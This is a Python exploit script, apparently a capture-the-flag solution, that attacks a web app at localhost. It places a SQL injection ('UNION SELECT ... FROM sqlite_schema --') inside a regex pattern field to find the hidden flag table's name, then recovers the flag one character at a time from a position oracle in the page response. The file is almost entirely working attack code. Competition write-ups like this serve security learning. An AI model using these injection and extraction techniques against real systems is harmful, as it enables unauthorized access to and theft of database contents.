import requests
import string
import re
url = "http://localhost:3000" # INSERT URL HERE WHEN NOT DOING LOCALLY
bank = string.ascii_uppercase + string.digits
bank2 = string.ascii_letters + string.digits + "_}{"
# First we need to get the name of the flag table
# We can use SQL injection to get rndAns to be the name of the flag table 
# Since it tells us at what position our guess differs, we can find the flag one char at a time.
pos = 4
flagTable = "flagAAAAAAAAAAAAA"
while pos < 17:
    for c in bank:
        flagTable = flagTable[:pos] + c + flagTable[pos+1:]
        # this works as a sql injection since the ?*( and )* stuff are in quotes/comments and it works as a regex since
        # the UNION SELECT stuff is in a capturing group with * so it doesn't need to exist
        r = requests.post(url, data={"ptrn": "?*(' UNION SELECT name AS word FROM sqlite_schema --)*", "word": flagTable})
        if "HUHH WHAT" in r.text:
            print(flagTable)
            pos = 17
            break
        newPos = int(re.findall("CHAR ([0-9]+)</h3>",r.text)[0])
        if pos != newPos:
            pos = newPos
            print(pos, flagTable)
            break

# Now we can get the flag with the same tactic
flag = "bcactf{AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
pos = 0
while True:
    for c in bank2:
        flag = flag[:pos] + c + flag[pos+1:]
        r = requests.post(url, data={"ptrn": f"?*(' UNION SELECT flag AS word FROM {flagTable} --)*", "word": flag})
        if "HUHH WHAT" in r.text:
            print(flag)
            break
        newPos = int(re.findall("CHAR ([0-9]+)</h3>",r.text)[0])
        if pos != newPos:
            pos = newPos
            print(pos, flag)
            break
    if flag.find("}") > -1:
        print(flag)
        break


